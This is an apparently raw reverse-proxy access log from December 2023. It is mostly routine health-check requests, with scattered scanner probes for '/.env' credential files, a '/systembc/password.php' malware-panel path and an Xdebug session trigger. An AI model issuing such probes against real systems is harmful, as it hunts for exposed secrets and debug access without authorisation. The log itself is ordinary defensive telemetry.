167.71.120.76 - - [18/Dec/2023:10:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4837 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4838 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4839 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4840 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4841 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4842 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4843 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4844 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4845 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4846 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4847 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4848 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4849 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4850 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4851 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4852 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4853 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4854 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4855 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4856 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4857 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4858 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4859 "www@docker" "http://172.18.0.9:80" 1ms
170.254.75.87 - - [18/Dec/2023:10:59:09 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4860 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4861 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4862 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4863 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4864 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4865 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:11:01:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4866 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:11:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4867 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4868 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4869 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4870 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4871 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4872 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [18/Dec/2023:11:04:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4873 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:11:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4874 "www@docker" "http://172.18.0.9:80" 0ms
45.79.172.21 - - [18/Dec/2023:11:04:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4875 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4876 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4877 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4878 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4879 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4880 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4881 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4882 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4883 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4884 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4885 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4886 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4887 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4888 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4889 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4890 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4891 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4892 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4893 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4894 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4895 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4896 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4897 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4898 "www@docker" "http://172.18.0.9:80" 0ms
68.69.186.30 - - [18/Dec/2023:11:16:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4899 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:11:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4900 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4901 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4902 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4903 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4904 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4905 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4906 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4907 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4908 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4909 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4910 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4911 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4912 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [18/Dec/2023:11:22:58 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4913 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:11:22:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4914 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4915 "www@docker" "http://172.18.0.9:80" 0ms
45.56.108.128 - - [18/Dec/2023:11:23:32 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 4916 "-" "-" 0ms
143.110.222.166 - - [18/Dec/2023:11:23:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4917 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:11:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4918 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4919 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4920 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:11:24:56 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4921 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:11:24:56 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4922 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4923 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4924 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4925 "www@docker" "http://172.18.0.9:80" 0ms
45.56.108.128 - - [18/Dec/2023:11:26:36 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 4926 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:11:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4927 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4928 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4929 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4930 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4931 "www@docker" "http://172.18.0.9:80" 0ms
222.181.11.186 - - [18/Dec/2023:11:28:56 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 4932 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4933 "www@docker" "http://172.18.0.9:80" 1ms
101.68.46.194 - - [18/Dec/2023:11:29:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4934 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:11:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4935 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4936 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4937 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4938 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4939 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4940 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4941 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4942 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4943 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4944 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4945 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4946 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4947 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4948 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4949 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4950 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4951 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4952 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4953 "www@docker" "http://172.18.0.9:80" 0ms
45.79.163.53 - - [18/Dec/2023:11:38:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4954 "-" "-" 0ms
172.104.11.4 - - [18/Dec/2023:11:38:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4955 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4956 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4957 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4958 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4959 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [18/Dec/2023:11:41:06 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4960 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:11:41:06 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4961 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4962 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4963 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4964 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4965 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4966 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4967 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4968 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4969 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4970 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4971 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4972 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4973 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4974 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4975 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4976 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4977 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4978 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4979 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4980 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4981 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4982 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4983 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [18/Dec/2023:11:51:43 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4984 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:11:51:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4985 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4986 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4987 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4988 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4989 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4990 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4991 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4992 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4993 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:11:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4994 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4995 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4996 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:11:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4997 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:11:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4998 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4999 "www@docker" "http://172.18.0.9:80" 0ms
193.37.69.208 - - [18/Dec/2023:11:58:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5000 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:11:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5001 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:11:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5002 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:12:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5003 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:12:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5004 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:12:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5005 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:12:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5006 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:12:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5007 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:12:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5008 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:12:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5009 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:12:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5010 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:12:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5011 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:12:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5012 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:12:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5013 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:12:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5014 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:12:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5015 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:12:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5016 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [18/Dec/2023:12:06:44 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 5017 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [18/Dec/2023:12:06:45 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 5018 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:12:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5019 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:12:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5020 "www@docker" "http://172.18.0.9:80" 0ms
